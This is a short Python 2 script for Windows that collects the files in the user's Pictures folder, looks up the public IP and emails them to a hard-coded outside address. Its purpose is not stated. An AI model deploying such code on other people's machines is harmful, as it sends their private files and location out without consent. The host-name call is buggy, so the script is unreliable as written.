#default is windows os

#given the default dir is Pictures

import os
import time
import socket
from urllib2 import urlopen

import email_client
pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")

files = os.listdir(pic_path)

def generate_abs_path(f):
    return pic_path+"\\"+f

abs_files_name = map(generate_abs_path,files)

current_time = time.strftime("%Y-%m-%d %H:%M:%S")



#print "last modified: %s" % time.ctime(os.path.getctime(abs_files_name[0]))

print time.mktime(time.strptime(time.ctime(os.path.getctime(abs_files_name[0])),"%a %b %d %H:%M:%S %Y"))

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostname(socket.gethostname())

email_client.mail("848334436@qq.com",
   "From %s computer" %current_public_ip,
   current_time +"\r\n %s" %current_inner_ip,
   abs_files_name)
